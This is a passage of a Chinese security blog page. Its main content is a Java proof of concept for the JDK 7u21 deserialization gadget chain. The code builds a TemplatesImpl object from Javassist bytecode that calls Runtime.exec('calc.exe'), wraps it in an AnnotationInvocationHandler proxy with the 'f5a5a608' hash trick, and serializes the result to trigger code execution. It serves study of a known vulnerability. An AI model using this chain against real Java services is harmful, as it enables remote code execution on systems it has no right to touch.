class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.LinkedHashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdk7u21Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(Cat.class.getName());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">zeroHashCodeStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;f5a5a608&quot;</span>;<br><br>        <span class="hljs-comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(zeroHashCodeStr, <span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-comment">// 实例化AnnotationInvocationHandler类</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">handlerConstructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        handlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">tempHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);<br><br>        <span class="hljs-comment">// 为tempHandler创造一层代理</span><br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(Jdk7u21Demo.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);<br><br>        <span class="hljs-comment">// 实例化HashSet，并将两个对象放进去</span><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>();<br>        set.add(templates);<br>        set.add(proxy);<br><br>        <span class="hljs-comment">// 将恶意templates设置到map中</span><br>        map.put(zeroHashCodeStr, templates);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(set);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/JavaWeb/">JavaWeb</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/java/">java</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/15/SSTI%EF%BC%88%E5%83%8Fh3%E5%B8%88%E5%82%85%E5%AD%A6%E4%B9%A0%EF%BC%89/">
+                        <span class="hidden-mobile">SSTI（像h3师傅学习）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+    <!--《添加网站运行时间 -->
+<br/>
+
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+var now = new Date(); 
+
+function createtime() {
+    //此处修改你的建站时间或者网站上线时间
+    var grt = new Date('02/23/2022 00:00:00');
+    now.setTime(now.getTime() + 250);
+    days = (now - grt) / 1000 / 60 / 60 / 24;
+
+    dnum = Math.floor(days);
+    hours = (now - grt) / 1000 / 60 / 60 - (24 * dnum);
+    hnum = Math.floor(hours);
+    if (String(hnum).length == 1) {
+        hnum = "0" + hnum;
+    }
+    minutes = (now - grt) / 1000 / 60 - (24 * 60 * dnum) - (60 * hnum);
+    mnum = Math.floor(minutes);
+    if (String(mnum).length == 1) {
+        mnum = "0" + mnum;
+    }
+    seconds = (now - grt) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+    snum = Math.round(seconds);
+    if (String(snum).length == 1) {
+        snum = "0" + snum;
+    }
+    document.getElementById("timeDate").innerHTML = "" + dnum + " 天 ";
+    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+}
+setInterval("createtime()", 250);
+</script>
+
+<!-- 添加网站运行时间》-->
+
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
